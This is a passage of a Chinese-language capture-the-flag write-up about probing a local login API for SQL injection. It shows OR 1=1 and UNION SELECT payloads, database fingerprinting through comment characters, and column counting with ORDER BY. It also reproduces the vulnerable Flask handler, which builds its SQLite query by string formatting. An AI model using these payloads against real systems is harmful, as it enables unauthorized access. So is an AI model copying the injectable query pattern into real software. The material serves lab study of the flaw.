## 侦察与探测

使用之前挑战相同的 SQLi 载荷
- 请求
    ```http
    POST /api/v1/login/ HTTP/1.1
    Host: 127.0.0.1:8000
    Content-Type: application/json

    {"username":"wiener' OR 1=1 LIMIT 1 -- ","password":"peter"}
    ```
- 响应
    ```json
    {
        "status":"success"
    }
    ```
    - 此处仍为相同 SQLi 缺陷，然而移除了 flag

- 类型探测
    - `--` 成功，非 mysql
    - `#` 失败，或为 PostgreSQL

- 用户表探测
    ```sql
    username='' OR 1=1 LIMIT 1 OFFSET 3 --
    ```
    - 成功，拥有多个用户

- 查询列探测
    ```sql
    username='' OR 1=1 ORDER BY 3 --
    ```
    - 拥有3列

- 设置联合查询
    ```sql
    username = '' UNION SELECT null,null,null --
    ```
    - 预期得到失败，但意外得到成功

- 继续测试列类型：数字型 `1,2,3` 与字符型 `'a','b','c'` 均成功

- 预期后端查询

    ```sql
    SELECT c1,c2,c3 FROM table_uk WHERE username='§§' AND password='§§'
    ```

- 挑战标注预期解法非暴破。但当前仅观察到 miss/hit 触点用来进行盲注

查看容器内代码
```py
#API routes
@app.route('/api/v1/login/', methods = ['POST'])
def login():
    if request.method == 'POST':
        username, password = (request.json['username'],request.json['password'])
        g.db = connect_db()
        try:
            cur = g.db.execute("SELECT * FROM players WHERE username = '{}' AND password = '{}'".format(username, hash_pass(password)))
            if cur.fetchone():
                result = {'status': 'success'}
            else:
                result = {'status': 'fail'}
        except sqlite3.OperationalError:
            result={'status': 'fail'}
        else:
            g.db.close()
        return jsonify(result)
```
- 此处不存在任何回显，且异常被接受并返回同样的 `fail`
